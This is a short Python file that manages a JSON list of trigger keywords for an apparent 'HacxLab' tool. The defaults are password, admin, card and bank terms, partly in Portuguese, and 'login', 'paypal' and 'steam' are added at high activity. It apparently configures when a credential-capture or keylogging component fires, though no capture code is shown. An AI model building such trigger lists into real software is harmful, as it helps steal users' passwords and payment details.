import json, os

settings_file = "C:\\HacxLab\\hacx_ai_settings.json"
DEFAULT_TRIGGERS = ["senha", "admin", "1234", "cartao", "bank"]

def load_triggers():
    if os.path.exists(settings_file):
        try:
            with open(settings_file, 'r') as f:
                return json.load(f).get("triggers", DEFAULT_TRIGGERS)
        except:
            return DEFAULT_TRIGGERS
    return DEFAULT_TRIGGERS

def save_triggers(triggers):
    with open(settings_file, 'w') as f:
        json.dump({"triggers": triggers}, f)

def adjust_triggers(activity_level, triggers):
    if activity_level > 20:
        triggers += ["login", "paypal", "steam"]
    return triggers